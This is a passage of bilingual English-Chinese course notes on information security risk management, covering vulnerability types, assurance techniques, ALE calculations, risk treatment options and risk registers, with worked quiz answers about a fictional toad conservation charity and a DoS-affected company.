href="https://www.ncsc.gov.uk/cisp">https://www.ncsc.gov.uk/cisp</a>)</li></ul><p>Most vulnerabilities specified as a Common Vulnerability and Exposures format (CVE) 通用漏洞和暴露格式</p><ul><li><a href="http://cve.mitre.org/">http://cve.mitre.org/</a> </li><li>Common Vulnerability Scoring System - <a href="https://www.first.org/cvss/">https://www.first.org/cvss/</a></li></ul><h5 id="Hardware-Vulnerabilities"><a href="#Hardware-Vulnerabilities" class="headerlink" title="Hardware Vulnerabilities"></a>Hardware Vulnerabilities</h5><ul><li>Covers phones, routers, switches etc. </li><li>Can be a hardwired problem </li><li>This includes firmware - Often concerns about upgrading </li><li>Vendors are often slower at responding than SW vendors 供应商的响应速度往往比软件供应商慢</li></ul><h5 id="Application-Vulnerabilities"><a href="#Application-Vulnerabilities" class="headerlink" title="Application Vulnerabilities"></a>Application Vulnerabilities</h5><ul><li>This is where hackers are going</li><li>OS vendors getting better at writing secure code, security auditing, patching, secure config out of the box 操作系统供应商在编写安全代码、安全审计、打补丁、开箱即用的安全配置方面越来越好</li><li>Applications are the most vulnerable - A system is as strong as it’s weakest link 一个系统的强大在于它最薄弱的环节</li><li>Web and Mobile applications are the most fertile ground - Everything is a web or mobile app these days</li><li>Applications get poorly patched 应用程序的修补工作做得很差</li></ul><h5 id="System-Configuration"><a href="#System-Configuration" class="headerlink" title="System Configuration"></a>System Configuration</h5><ul><li>This is a difficult area as extensive knowledge is required<br>to do a good job</li><li>Most systems come preconfigured in a weak state - Default configuration have vulnerabilities 大多数系统在预设时都处于薄弱状态 - 默认配置有漏洞</li></ul><h5 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h5><ul><li>Vulnerabilities exist in people and processes </li><li>Helpdesks are there to assist people </li><li>People don’t really care about what happens to their corporate information - <a href="http://www.theregister.co.uk/2003/04/18/office_workers_give_away_passwords/">http://www.theregister.co.uk/2003/04/18/office_workers_give_away_passwords/</a> </li><li>Social Engineering Toolkit - Automated attack system</li></ul><p>The systematic examination of a system to identify those critical infrastructures or related components that may be at risk from an attack and the determination of appropriate procedures that can be implemented to reduce that risk</p><blockquote><p>对一个系统进行系统检查，以确定那些可能面临攻击风险的关键基础设施或相关组件，并确定可以实施的适当程序，以减少这种风险</p></blockquote><h5 id="Assurance-Techniques"><a href="#Assurance-Techniques" class="headerlink" title="Assurance Techniques"></a>Assurance Techniques</h5><ul><li>Techniques that allow us to establish the level of assurance we have about how secure a system is </li><li>The output of these techniques contributes to Vulnerability Assessment - Some techniques also contribute to other risk assessment steps like asset identification (architectural review) and threat assessment</li></ul><blockquote><ul><li>允许我们建立关于系统安全程度的保证水平的技术</li><li>这些技术的输出有助于脆弱性评估 - 一些技术也有助于其他风险评估步骤，如资产识别（架构审查）和威胁评估。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f6.png"></p><p>Different techniques to find vulnerabilities in systems </p><ul><li><p>Cost-effective decisions to choose which techniques to apply  选择应用哪些技术的成本效益决定</p></li><li><p>But domain decisions too! </p><ul><li><p>an organisation with just an operational environment may not be the best environment to use any of the “test” techniques like penetration testing because of the irreparable damage this may cause if anything goes wrong, and other types of less active and less aggressive techniques, like reviewing ones (architectural reviews, configurations reviews for instance) could be safer. </p><blockquote><p>一个只有运行环境的组织可能不是使用任何 “测试 “技术（如渗透测试）的最佳环境，因为如果出了问题，可能会造成不可挽回的损失，而其他类型的不太活跃和不太积极的技术，如审查技术（例如架构审查、配置审查）可能更安全</p></blockquote></li><li><p>A good example is that of a Nuclear power plant, would you do a penetration test on that one?</p></li></ul></li></ul><h3 id="quiz"><a href="#quiz" class="headerlink" title="quiz"></a>quiz</h3><p>Natterjack蟾蜍欣赏小组（GANT）是一个保护团体，热衷于促进和保护Nutterjack蟾蜍的福祉。它是一个在英国注册的慈善机构，在全世界拥有大量的成员，他们都热衷于促进GANT的工作。</p><p>不幸的是，所讨论的蟾蜍是一种濒临灭绝的物种，随着新地区的发展，它正逐渐被摧毁。例如，由于开发工作，它在威尔士的某些地区已经在当地灭绝，不得不重新引入。</p><p>All information for the group can be accessed using a web-based application or by contacting the group’s honorary secretary Dr Jane Peabody for the paper-based records. This information includes the group’s member records, its activities, meeting places, Natterjack Toad habitats, confidential aspects about their work, etc. In the past, members have raised concerns about information assurance as the website has been previously compromised owing to the server containing no significant security controls.</p><p>可以使用基于网络的应用程序或通过联系该组织的名誉秘书 Jane Peabody 博士获取纸质记录来访问该组织的所有信息。这些信息包括该组织的成员记录、其活动、会议地点、Natterjack Toad 栖息地、有关他们工作的机密方面等。在过去，成员们提出了对信息保障的担忧，因为该网站以前曾因服务器没有重要的安全控制而遭到破坏。</p><p>主席雷切尔·杰克逊女士听说过信息安全，并认为现在是更认真对待它的时候了，但她对此知之甚少。这就是您的切入点。Rachel Jackson 女士聘请了您的团队来了解有关保护他们信息的更多信息。</p><h4 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h4><p>What information assets under the control of GANT may require protection?</p><p><strong>All information assets</strong> require protection. Examples you might include in your answer could be <strong>members’ records</strong> (ie dates of birth, locations, passwords), or <strong>information about the toad’s habitat locations</strong> (if leaked, people may trespass upon them).</p><h4 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h4><p>Identify three threats and vulnerabilities that GANT’s information assurance system needs to manage.</p><p>A threat highlights a problem that if it arises will result in adverse consequences. This may include:</p><ol><li>Information about members being accessed by unauthorised persons.</li><li>Information about the habitats of the Natterjack toad being used by those who are not inclined to support its ongoing existence.</li><li>The website being compromised, and unofficial messages added to it.</li></ol><blockquote><p>有关会员的信息被未经授权的人访问<br>关于Natterjack蟾蜍的栖息地的信息被那些不愿意支持其继续存在的人使用<br>网站被破坏，非官方的信息被添加到网站上</p></blockquote><p>A vulnerability is a weakness in the system that might allow the threat to happen. This may include:</p><ol><li>Records of members being stored in an unreliable computer system that may crash in the future.</li><li>Information about the toad’s habitats being stored on an old internet-based, insecure server.</li><li>The administrator password for the website never having been changed from the default password.</li></ol><blockquote><p>成员的记录被储存在一个不可靠的计算机系统中，将来可能崩溃<br>有关蟾蜍栖息地的信息被储存在一个基于互联网的不安全的旧服务器上<br>网站的管理员密码从未从默认密码中修改</p></blockquote><h4 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h4><p>Explain to Ms Jackson what a threat agent is. Can you, from the threats you mentioned GANT could face, select one and discuss who the threat agent might be?</p><p>The threat agent is someone or something that may give rise to a threat. It is the likely culprit of a risk to the organisation. Threat agents can be natural, accidental, or malicious. 威胁源是指可能引起威胁的人或事。它是给组织带来风险的可能罪魁祸首。威胁因素可以是自然的、意外的或恶意的。</p><p>In the case of GANT, and for the threats already identified in the model answer for the previous question, threat agents may include:</p><ol><li>unscrupulous property developers who may gain access to personal details about members and later harass them</li><li>someone who is not interested in the existence of the toad, and therefore may contribute to its destruction</li><li>someone who might gain access to the GANT website and update it with offensive information.</li></ol><blockquote><ol><li>无良的房地产开发商，他们可能获得会员的个人资料，然后骚扰他们</li><li>对蟾蜍的存在不感兴趣的人，因此可能会促成蟾蜍的毁灭</li><li>可能进入GANT网站并以攻击性信息更新网站的人</li></ol></blockquote><h4 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h4><p>What would be the rationale you would use to choose the most adequate set of assurance techniques? 你会用什么理由来选择最充分的一套保证技术？</p><p>You could consider the actual context and domain of the organisation (eg testing the security of a normal IT system is not the same as a nuclear power plant). In particular, GANT has a web-based application, so one could consider potential ways in which attackers might exploit it.</p><blockquote><p>考虑该组织的实际情况和领域（例如，测试普通IT系统的安全与核电站的安全是不一样的）。特别是，GANT有一个基于网络的应用程序，所以可以考虑攻击者可能利用它的潜在方式</p></blockquote><p>Also, you may need to check for social engineering, for instance with regard to those custodians of the paper-based records at GANT.</p><blockquote><p>检查社会工程，例如关于那些在GANT的纸质记录的保管者</p></blockquote><p>Then, from the available possibilities, the most cost-effective ones should be chosen: that is, those with the lowest cost of performing them but which are most effective at discovering vulnerabilities.</p><blockquote><p>从现有的可能性中，应该选择最具成本效益的可能性：也就是说，那些执行成本最低但最能发现漏洞的可能性</p></blockquote><h2 id="Risk-assessment-amp-management"><a href="#Risk-assessment-amp-management" class="headerlink" title="Risk assessment &amp; management"></a>Risk assessment &amp; management</h2><h3 id="risk-assessment"><a href="#risk-assessment" class="headerlink" title="risk assessment"></a>risk assessment</h3><p>risk = threat × vulnerability × impact</p><h4 id="qualitative-risk-assessment"><a href="#qualitative-risk-assessment" class="headerlink" title="qualitative risk assessment"></a>qualitative risk assessment</h4><p>generally a workshop/interview approach</p><p>analysis avoids the over simplification to numbers</p><p>numbers are no substitute for human understanding</p><p>can draw together the apparently inconsequential bits of information</p><blockquote><p>通常采用研讨会/访谈的方式</p><p>分析避免了对数字的过度简化</p><p>数字不能代替人的理解</p><p>可以将明显无关紧要的信息汇总起来</p></blockquote><p>discourse analysis useful 话语分析</p><ul><li>language dependent on the environment and context</li><li>language used can be enlightening</li><li>discourse and data analysis used in other disciplines</li></ul><blockquote><ul><li>语言取决于环境和背景</li><li>所使用的语言可以给人以启迪</li><li>话语和数据分析在其他学科中使用</li></ul></blockquote><p>highly reliant on interviewer skills</p><p>There is a tendency to dismiss as IT is a hard technology area 这种定性的方式通常会被忽略，因为IT是一个纯技术领域</p><p>People are the problem and the solution</p><p>Information security need to be integrated with other business areas (Physical and Personnel Security)</p><h4 id="OWASP-Risk-Rating-Methodology"><a href="#OWASP-Risk-Rating-Methodology" class="headerlink" title="OWASP Risk Rating Methodology"></a>OWASP Risk Rating Methodology</h4><table><thead><tr><th></th><th></th><th><strong>Overall Risk Severity</strong></th><th></th><th></th></tr></thead><tbody><tr><td>impact</td><td>HIGH</td><td>Medium</td><td>High</td><td>Critical</td></tr><tr><td></td><td>MEDIUM</td><td>Low</td><td>Medium</td><td>High</td></tr><tr><td></td><td>LOW</td><td>Note</td><td>Low</td><td>Medium</td></tr><tr><td></td><td></td><td>LOW</td><td>MEDIUM</td><td>HIGH</td></tr><tr><td></td><td></td><td><strong>Likelihood</strong></td><td></td><td></td></tr></tbody></table><h4 id="quiz-1"><a href="#quiz-1" class="headerlink" title="quiz"></a>quiz</h4><p>GANT has recently acquired ten workstations to improve the IT capabilities of the company and help digitise the information it has on paper. The workstations come without internet connectivity or anti-virus software. The company now wants to provide internet connectivity to the workstations for employees to send and receive emails and surf the internet.</p><p>The company has asked you to determine the annual loss that can be expected from viruses and determine if it is beneficial in terms of cost to purchase licensed copies of anti-virus software for the workstations.</p><p>What you know:</p><ul><li>You read in a trade magazine that other charities have reported an 80 per cent chance of viruses infecting their network after installing internet connectivity.</li><li>The cost of restoring the network after an infection would be £5,000 (considering loss of data and labour).</li><li>A vendor will sell licensed copies of anti-virus software for all workstations at a cost of £500 per year.</li></ul><blockquote><p>GANT公司最近购买了10台工作站，以提高公司的IT能力，并帮助其将纸上的信息数字化。这些工作站没有互联网连接或防病毒软件。公司现在想为这些工作站提供互联网连接，以便员工发送和接收电子邮件以及上网。</p><ul><li>安装互联网连接后，病毒感染他们的网络的几率为80%</li><li>感染后恢复网络的费用将是5000英镑（考虑到数据和劳动力的损失）</li><li>一个供应商将以每年500英镑的价格出售所有工作站的反病毒软件许可拷贝</li></ul></blockquote><h5 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h5><p>What is the Annualised Rate of Occurrence (ARO) for this risk?</p><p>0.8</p><h5 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h5><p>What is the Single Loss Expectancy (SLE) for this risk, in pounds?</p><p>5000</p><h5 id="Q3-1"><a href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h5><p>What, therefore, is the Annual Loss Expectancy (again, in pounds)?</p><p>ALE = ARO * SLE = 0.8 * £5,000 = £4,000</p><h3 id="risk-treatment-and-monitoring"><a href="#risk-treatment-and-monitoring" class="headerlink" title="risk treatment and monitoring"></a>risk treatment and monitoring</h3><h4 id="importance-of-risk-management"><a href="#importance-of-risk-management" class="headerlink" title="importance of risk management"></a>importance of risk management</h4><p>Risk management aims to iteratively balance the system risk against the business strategy. <strong>The main aim is to minimise the risk to the organisation</strong>. However, a <strong>residual risk</strong> will always remain: there is no such thing as a 100 per cent secure system.</p><blockquote><p>风险管理旨在反复平衡系统风险与业务战略。主要目标是将组织的风险降至最低。然而，残余风险将始终存在：没有 100% 安全的系统。</p></blockquote><p>What are the different reasons for conducting risk management? </p><p>Possible answers include:</p><ul><li>to protect the business to make it more profitable</li><li>to make people think about Information Security and potential risks</li><li>having a documented risk management process is valuable to create an audit trail of decision makers.</li></ul><blockquote><ul><li>保护企业，使其更有利润</li><li>让人们思考信息安全和潜在的风险</li><li>拥有一个记录在案的风险管理过程是很有价值的，可以为决策者创造一个审计线索</li></ul></blockquote><h4 id="risk-treatment"><a href="#risk-treatment" class="headerlink" title="risk treatment"></a>risk treatment</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f7.png"></p><h5 id="avoid"><a href="#avoid" class="headerlink" title="avoid"></a>avoid</h5><p>This is a fairly clear-cut option. Put simply, it means not doing something that incurs risk. That is, to not do or to stop doing a business activity because it puts the organisation at too much risk. 不做或停止做某项商业活动，因为它使组织面临太大的风险</p><p>example:</p><p>A company might issue a security policy that states that users of company-owned computers must not install unauthorised software. This removes the risk of inappropriate software finding its way onto PCs within the organisation, and can be enforced by restricting the administrative capabilities of users.</p><blockquote><p>一个公司可能会发布一项安全政策，规定公司拥有的计算机的用户不得安装未经授权的软件。这就消除了不适当的软件进入公司内部电脑的风险，并可以通过限制用户的管理能力来执行。</p></blockquote><h5 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h5><p>In this case, the organisation is willing to live with or tolerate the risk.</p><p>When might this be the case? (two possible answers)</p><ol><li>the risk is very low</li><li>the cost of treating the risk may equal or exceed the financial loss.</li></ol><p>Why might you still want to reduce the risk, even in these circumstances?</p><p>For example, to maintain customer confidence.</p><p>Accepting risk has to be a <strong>conscious decision</strong>, and one for which one or more individuals are held accountable by means of a formal sign-off process. A record in the risk register (seen later) should indicate who has signed to accept the risk.</p><p>Acceptance of a risk <strong>is not the same as ignoring it</strong>. Risks that are ignored can cause problems later. Accepted risks <strong>must be monitored and reviewed</strong> at suitable intervals in case the impact or likelihood has changed since the initial assessment was carried out.</p><blockquote><p>接受风险必须是一个有意识的决定，而且是一个由一个或多个人通过正式签字程序负责的决定。风险登记册中的记录（见下文）应表明谁签署了接受该风险。</p><p>接受风险不等于忽视它。被忽视的风险可能会导致以后的问题。接受的风险必须在适当的时间段进行监测和审查，以防止影响或可能性自最初的评估进行后发生变化。</p></blockquote><h5 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h5><p>This is when security controls are applied to reduce the risk.</p><p>three types of reduction:</p><p><strong>Reducing the threat</strong></p><p>This is very difficult! For example, although it would be nice to get rid of hackers completely, this would require significant social reform and is therefore an unlikely option. 尽管完全摆脱黑客是件好事，但这需要重大的社会改革，因此是一个不太可能的选择</p><p><strong>Reducing the vulnerability</strong></p><p>For example, by applying appropriate security patches to an operating system or tightening the security settings on a firewall, the likelihood of hackers gaining access is reduced, though not removed. 通过给操作系统打上适当的安全补丁或收紧防火墙的安全设置，黑客获得访问权的可能性就会减少，尽管并没有消除。</p><p><strong>Reducing the impact</strong></p><p>For example, if the whole of an organisation’s information assets reside on one main system, this would represent a potential single point of failure, and could be mitigated by introducing either a physical or virtual data separation system, or a disaster recovery standby system. 如果一个组织的全部信息资产都在一个主系统上，这将代表一个潜在的单点故障，可以通过引入一个物理或虚拟数据分离系统，或一个灾难恢复备用系统来缓解。</p><h5 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h5><p>This is where the risk is passed on to another entity or organisation. </p><p>two main ways of doing this:</p><p><strong>outsourcing</strong>: risk is moved to a third party when the relevant expertise to manage the risk is not available within the organisation. For example, media containing sensitive information might require secure disposal and the organisation thus outsources the work to a specialist company.</p><blockquote><p>外包：当组织内部不具备管理风险的相关专业知识时，风险被转移到第三方。例如，含有敏感信息的媒体可能需要安全处理，组织因此将这项工作外包给一家专业公司</p></blockquote><p><strong>An insurance policy</strong>: this is an especially appropriate method when the impact of the risk can be measured as a purely financial one and is estimated to be high. 当风险的影响可以作为一个纯粹的金融影响来衡量，并且估计很高时，这是一个特别合适的方法</p><h4 id="risk-monitoring"><a href="#risk-monitoring" class="headerlink" title="risk monitoring"></a>risk monitoring</h4><p>The frequency of monitoring may vary according to the type of threat:</p><p>some threats may change very quickly and will require monitoring at frequent intervals others, however, will change little over long periods of time and will only need occasional monitoring.<br>The whole risk management cycle should be repeated over time, as some threats might disappear completely and new threats might emerge. The interval will depend largely upon the risk appetite of the organisation and may well be documented in a risk management strategy or policy document.</p><blockquote><p>有些威胁可能变化得非常快，需要频繁地进行监测，而其他威胁在很长一段时间内变化不大，只需要偶尔监测。<br>整个风险管理周期应该随着时间的推移不断重复，因为有些威胁可能完全消失，而新的威胁可能出现。间隔将在很大程度上取决于组织的风险偏好，并且很可能被记录在风险管理战略或政策文件中</p></blockquote><h5 id="Risk-registers"><a href="#Risk-registers" class="headerlink" title="Risk registers"></a>Risk registers</h5><p>What information do we need to keep about risks? </p><ul><li>the threats and the vulnerabilities which the risk might exploit</li><li>the assessed impact and likelihood, and the overall risk calculated from these</li><li>the recommended treatment (accept, avoid, reduce, transfer)</li><li>the actual action(s) to be taken and the person or department responsible for carrying out this work, and the date by which it is expected to be completed.</li></ul><blockquote><ul><li>风险可能利用的威胁和漏洞</li><li>评估的影响和可能性，以及根据这些计算出的总体风险</li><li>建议的处理方法（接受、避免、减少、转移）。</li><li>将要采取的实际行动，负责执行这项工作的人或部门，以及预计完成的日期。</li></ul></blockquote><p>风险登记册至少包含每个风险的上述所有信息</p><p>Risk registers are also updated regularly. This is typically done on a monthly or quarterly basis, so that they can also reflect the potential impact of any external sources of change, such as:</p><ul><li>local legislation</li><li>national or international regulation</li><li>standards</li><li>reports</li></ul><blockquote><p>风险登记册也会定期更新。这通常是在每月或每季度的基础上进行的，以便它们也能反映任何外部变化来源的潜在影响，例如。</p><ul><li>当地立法</li><li>国家或国际法规</li><li>标准</li><li>报告</li></ul></blockquote><h4 id="Risk-management-decision-making"><a href="#Risk-management-decision-making" class="headerlink" title="Risk management decision making"></a>Risk management decision making</h4><p>The risk management process aims to mitigate risks to an acceptable level</p><p>who defines the acceptable level? Who are the stakeholders?</p><h5 id="The-board"><a href="#The-board" class="headerlink" title="The board"></a>The board</h5><ul><li>ultimate responsibility and accountability</li><li>defines how risk management is done as part of the business, and the risk appetite</li><li>leads by example in the risk culture, and sponsors the risk management process</li><li>allocates resources.</li></ul><blockquote><ul><li>最终责任和问责</li><li>界定如何将风险管理作为业务的一部分进行，以及风险偏好</li><li>在风险文化中以身作则，并赞助风险管理过程</li><li>分配资源</li></ul></blockquote><h5 id="Risk-manager"><a href="#Risk-manager" class="headerlink" title="Risk manager"></a>Risk manager</h5><p>Overall responsibility for ensuring that risk level is maintained. The risk manager is tasked with managing the risk down to an <strong>acceptable level</strong> (remember that not all risk can be eliminated). Key duties include:</p><ul><li>developing the risk environment</li><li>management of the risk assessment process</li><li>facilitation of the risk process across the organisation.</li></ul><blockquote><p>全面负责确保风险水平得到维持。风险经理的任务是将风险降至可接受的水平（记住，不是所有的风险都能消除）主要职责包括</p><ul><li>发展风险环境</li><li>管理风险评估过程</li><li>促进整个组织的风险进程</li></ul></blockquote><h5 id="Business-unit-owner"><a href="#Business-unit-owner" class="headerlink" title="Business unit owner"></a>Business unit owner</h5><ul><li>responsible for delivery of security policy and procedures (which requires buy-in from others: see below)</li><li>responsible for the operational risk (as they are domain experts, and best placed to spot issues)</li><li>responsible for risk awareness and policy adherence in the unit.</li></ul><blockquote><p>业务单位负责人</p><ul><li>负责交付安全政策和程序（这需要其他人的支持：见下文）。</li><li>负责运营风险（因为他们是领域专家，是发现问题的最佳人选）。</li><li>负责本单位的风险意识和政策的遵守</li></ul></blockquote><h5 id="Core-functions"><a href="#Core-functions" class="headerlink" title="Core functions"></a>Core functions</h5><p>That is, HR, Finance and so on.</p><p>They can have a business wide view, and offer business insight at a higher level.  他们有一个广泛的业务视野，并在更高层次上提供业务洞察力</p><h5 id="All-staff"><a href="#All-staff" class="headerlink" title="All staff"></a>All staff</h5><p>The organisation must have buy-in from everyone. 组织必须得到每个人的认同 With that in mind: </p><ul><li>How do you build the right risk culture?</li><li>What responses are activated by the security messages you send out?</li></ul><blockquote><p>你如何建立正确的风险文化？<br>你发出的安全信息会激活哪些反应？</p></blockquote><table><thead><tr><th align="left">Threat versus vulnerability</th><th>For instance, if we talk about a potential vulnerability that a company has but we do not talk about <strong>who</strong> might exploit it, then the overall risk may be perceived as less important.</th></tr></thead><tbody><tr><td align="left">Likelihood versus impact</td><td>For instance, one could be emphasising that a risk may have a very high impact, and that if the likelihood is not correctly conveyed it could lead to misinterpretation of the risk (for example, when the likelihood of the risk materialising is remote despite the potential very high impact).</td></tr></tbody></table><blockquote><p>如果我们谈论一个公司拥有的潜在漏洞，但我们不谈论谁可能利用它，那么整体风险可能被认为不太重要</p><p>人们可以强调，一个风险可能有非常高的影响，如果不正确地传达可能性，可能会导致对风险的误解（例如，当风险实现的可能性很小，尽管可能有非常高的影响）</p></blockquote><p>Here are some key points to bear in mind:</p><ul><li>Be careful not to represent a clean-cut risk assessment, as subjectivity is always fuzzy.</li><li>Risk combinations enable a ranking of order, which may be very useful to prioritise the most important risks. Rankings can provide an easy way to communicate risk, but qualifying statements are important here.</li><li>Be aware that many visual representations oversimplify the risk landscape.</li><li>The communication of risk is vital for the success of any work to be completed (in terms of both how the risk will be perceived and what the stakeholder buy-in will be).</li></ul><blockquote><ul><li>要注意不要表现出清一色的风险评估，因为主观性总是模糊的。</li><li>风险组合能够进行排序，这对于确定最重要的风险的优先次序可能非常有用。排名可以为沟通风险提供一种简单的方式，但在这里，限定的陈述是很重要的。</li><li>请注意，许多视觉化的表达方式过度简化了风险状况。</li><li>风险的沟通对于任何要完成的工作的成功都是至关重要的（在如何看待风险和利益相关者的接受程度方面）</li></ul></blockquote><h4 id="quiz-2"><a href="#quiz-2" class="headerlink" title="quiz"></a>quiz</h4><p><strong>SEM Ltd</strong> is a company that operates an online service 24/7 all days of the year, serving 10,000 customers all over the world. SEM Ltd has suffered 80 Denial of Service (DoS) attacks since they started operating four years ago. Every time this attack happens, it causes losses of £1 per customer, as their services are not available to their customers until SEM Ltd’s IT team manage to relaunch the online platform.</p><blockquote><p>为世界各地的10,000名客户提供服务。SEM有限公司自四年前开始运营以来，已经遭受了80次拒绝服务（DoS）攻击。每次这种攻击发生时，都会给每个客户造成1英镑的损失</p></blockquote><h5 id="Q1-2"><a href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h5><p>What is the ALE for this risk? (give your answer in pounds)</p><p>ALE = ARO × SLE = (80/4) × 10,000 = 200,000</p><h5 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h5><p>If an off-the-shelf DoS mitigation appliance costs £45,000 per year, what type of risk treatment would you recommend?</p><p>Explain why and include the specific name of the risk treatment type, together with the particular action recommended for this risk.</p><blockquote><p>如果一个现成的DoS缓解设备每年花费45,000英镑，你会建议哪种类型的风险处理？</p><p>解释一下原因，并包括风险处理类型的具体名称，以及为该风险推荐的特定行动</p></blockquote><p>Given that the ALE for this risk is £200,000 and the off-the-shelf DoS mitigation appliance costs £45,000, the most reasonable risk treatment type is to <strong>reduce</strong> the risk by buying and installing the appliance.</p><h5 id="Q3-2"><a href="#Q3-2" class="headerlink" title="Q3"></a>Q3</h5><p>If the off-the-shelf DoS mitigation appliance cost £199,000 per year, what type of risk treatment would you recommend?</p><p>Again, explain why and include the specific name of the risk treatment type, together with the particular action recommended for this risk.</p><p>Here there are two potential solutions. The first one would be that, given that the ALE for this risk is £200,000 and the off-the-shelf DoS mitigation appliance costs £199,000, the most cost-efficient risk treatment type is to <strong>accept</strong> the risk, as it will be costing the company roughly the same.</p><blockquote><p>考虑到这个风险的ALE是200,000英镑，而现成的DoS缓解设备的成本是199,000英镑，最具成本效益的风险处理方式是接受这个风险，因为它将使公司的成本大致相同</p></blockquote><p>However, this is open to interpretation and so the second solution could still be to <strong>reduce</strong> as in the previous question, as even if it costs the company roughly the same, by avoiding the DoS attacks you also increase the confidence among your customers about the reliability of the service which can positively impact in the reputation of the company and bring new customers.</p><blockquote><p>第二种解决方案仍然可以像前一个问题那样减少，因为即使公司的成本大致相同，通过避免DoS攻击，你也增加了客户对服务可靠性的信心，这可以对公司的声誉产生积极的影响并带来新客户</p></blockquote><h2 id="Challenges-for-risk-management"><a href="#Challenges-for-risk-management" class="headerlink" title="Challenges for risk management"></a>Challenges for risk management</h2><h3 id="Challenge-How-to-understand-the-risks-posed-by-unanticipated-cyber-threats"><a href="#Challenge-How-to-understand-the-risks-posed-by-unanticipated-cyber-threats" class="headerlink" title="Challenge: How to understand the risks posed by unanticipated cyber threats?"></a>Challenge: How to understand the risks posed by unanticipated cyber threats?</h3><p>如何理解未预料到的网络威胁所带来的风险？</p><blockquote><p>example: </p><p>driving blind spots 驾驶盲点</p><p>‘zero day’ vulnerabilities</p></blockquote><p>why is it hard?</p><ul><li>Information security risk assessments tend to focus only on information security in the organisation in question </li><li>Often neglected: how members of the organisation’s supply chain (products/services) assess and manage information security risk and the impacts on the organisation </li><li>Bifurcate online/offline and treat end users as separate from technologies - Information security risk is socially constructed at the point where technology intersects with end-users </li><li>Understanding the risk context in such complex organisational eco-systems is extremely challenging</li></ul><blockquote><ul><li><p>信息安全风险评估往往只关注有关组织内的信息安全问题 </p></li><li><p>经常被忽视的是：组织的供应链（产品/服务）成员如何评估和管理信息安全风险以及对组织的影响。</p></li><li><p>将网上/网下分隔开，并将终端用户与技术分开对待 - 信息安全风险是在技术与终端用户相交的地方从社会角度构建的。</p></li><li><p>在如此复杂的组织生态系统中理解风险背景是极具挑战性的。</p></li></ul></blockquote><h3 id="Challenge-How-to-address-the-lack-of-risk-ownership-by-those-other-than-the-risk-assessors"><a href="#Challenge-How-to-address-the-lack-of-risk-ownership-by-those-other-than-the-risk-assessors" class="headerlink" title="Challenge: How to address the lack of risk ownership by those other than the risk assessors?"></a>Challenge: How to address the lack of risk ownership by those other than the risk assessors?</h3><p>如何解决风险评估员以外的人缺乏风险所有权的问题？</p><ul><li>Collective responsibility = no responsibility </li><li>But…individual responsibility without control = stress </li><li>Need to clearly define the scope of risk management roles </li><li>Basic-level assessment frameworks, such UK Cyber Essentials, aim to define a manageable set of checks for protecting organisations against the most common attacks</li></ul><blockquote><ul><li><p>集体的责任=没有责任 </p></li><li><p>但是……没有控制的个人责任=压力 </p></li><li><p>需要明确界定风险管理角色的范围 </p></li><li><p>基本级别的评估框架，如英国Cyber Essentials，旨在定义一套可管理的检查，以保护组织免受最常见的攻击</p></li></ul></blockquote><p>why is it hard?</p><ul><li>Information security risk management is seen as “imposed from high up” </li><li>Organisational cultural shift is a very hard problem</li></ul><blockquote><ul><li>信息安全风险管理被认为是 “高高在上 “的。</li><li>组织的文化转变是一个非常困难的问题</li></ul></blockquote><p>what do we need?</p><ul><li>Better approaches for capturing information security risk context - Everyone in the organisation can have a contribution to make </li><li>Need to have better means to engage risk assessors and other members of an organisation in effective dialogue about risk assessments, risk communication and risk management</li></ul><blockquote><ul><li>捕捉信息安全风险背景的更好方法 - 组织中的每个人都可以做出贡献 </li><li>需要有更好的方法让风险评估员和组织的其他成员参与有关风险评估、风险交流和风险管理的有效对话。</li></ul></blockquote><h3 id="Challenge-Artificial-Intelligence-Risks"><a href="#Challenge-Artificial-Intelligence-Risks" class="headerlink" title="Challenge: Artificial Intelligence Risks"></a>Challenge: Artificial Intelligence Risks</h3><blockquote><ul><li><p>Attacks on voice-controlled smart assistants and other speech interfaces </p></li><li><p>Voice-cloning (deep fakes) used by attackers</p></li><li><p>对语音控制的智能助理和其他语音界面的攻击 </p></li><li><p>攻击者使用的语音克隆（深度伪造）</p></li></ul></blockquote><p>Adversarial Machine Learning 对抗式机器学习</p><p>Key issue in Adversarial ML: bad actors will attempt to exploit the ML model itself </p><p>Example: evasion attacks 逃避攻击 </p><ul><li><p>Attacks on ML, where malicious objects are deliberately transformed to make a ML model make wrong predictions</p><blockquote><p>对ML的攻击，即故意改造恶意对象，使ML模型做出错误的预测</p></blockquote></li></ul><h3 id="Challenge-Supply-chain-security"><a href="#Challenge-Supply-chain-security" class="headerlink" title="Challenge: Supply chain security"></a>Challenge: Supply chain security</h3><p>indirect attacks via an organisation’s contractors 通过一个组织的承包商进行间接攻击</p><p>For SME, 中小型企业</p><ul><li>Internet facilitated expanding their market reach – but exposed them to cyber risks. </li><li>Less resources than larger organisations for cyber security. </li><li>Part of the supply chain of larger organisations. - Risking not just their own, but also their customers’ and partners’ data and security</li></ul><blockquote><ul><li>互联网促进了他们市场范围的扩大 - 但也使他们面临网络风险。</li><li>在网络安全方面的资源比大型组织少。</li><li>属于大型组织的供应链的一部分 - 不仅仅是他们自己的风险，而且还有他们的客户和合作伙伴的数据和安全风险</li></ul></blockquote><p>Cyber Essentials</p><ul><li><p>CE was introduced by the UK government in collaboration with standards and private sector orgs (IASME, ISF, BSI) in 2014.</p></li><li><p>Aims: “basic controls to help organisations to protect themselves against common non-targeted cyber attacks”</p></li><li><p>Not only for SMEs but especially attractive to them for basic affordable cyber hygiene.</p></li><li><p>UK government and private companies (HP) to make it mandatory for their supply 